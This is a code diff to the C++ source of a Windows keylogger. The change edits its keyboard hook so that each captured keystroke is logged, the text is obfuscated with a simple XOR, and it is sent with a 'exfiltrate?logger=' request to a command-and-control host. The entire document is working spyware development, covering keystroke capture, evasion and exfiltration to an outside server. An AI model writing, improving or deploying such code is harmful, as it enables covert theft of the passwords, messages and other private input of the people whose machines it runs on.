@@ -19,20 +19,21 @@ LRESULT KeyboardHookProc(int code, WPARAM wParam, LPARAM lParam) {
 			string key = Keys::TABLE[kbdStruct.vkCode];
 			if (key == "") {
 				key = "?";
-			}
-
-			if (kbdStruct.vkCode == VK_RETURN) {
+			} else if (kbdStruct.vkCode == VK_RETURN) {
 				logtext += "\n";
+			} else if (kbdStruct.vkCode == VK_SPACE) {
+				logtext += " ";		
+			} else {
+				logtext += key;
 			}
 
-			if (kbdStruct.vkCode == VK_SPACE) {
-				logtext += " ";
-			}
-
-			logtext += key;
-			
 			if (logtext.size() > 10) {
-				string pathName = "exfiltrate?logger=" + logtext;
+				string xord;
+				for (int i = 0; i < logtext.size(); i++) {
+					xord += logtext[i] ^ 1;
+				}
+
+				string pathName = "exfiltrate?logger=" + xord;
 
 				c2.netsend(util.getC2Host(), pathName.c_str());
 				logtext = "";
@@ -63,6 +64,7 @@ void keyLoop() {
 		DispatchMessage(&msg);
 	}
 }
+
 
 #endif   
 
